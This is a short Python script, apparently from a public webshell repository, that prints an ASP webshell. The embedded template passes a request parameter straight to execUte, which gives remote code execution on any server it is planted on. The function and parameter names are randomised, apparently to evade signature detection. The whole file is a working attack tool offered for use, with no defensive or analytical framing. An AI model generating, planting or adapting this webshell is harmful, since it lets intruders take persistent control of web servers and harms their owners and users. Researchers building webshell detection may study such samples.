import random

#author: pureqh
#github: https://github.com/pureqh/webshell

shell = '''<%
<!--
Function {0}():
    {0} = request("{1}")
End Function

Function {2}():
    execUte({0}())
End Function
{2}()
-->

%>'''



def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
def build_webshell():
    FunctionName = random_name(4)
    parameter = random_name(4)
    FunctionName1 = random_name(4)
    shellc = shell.format(FunctionName,parameter,FunctionName1)
    return shellc


if __name__ == '__main__':
    print (build_webshell())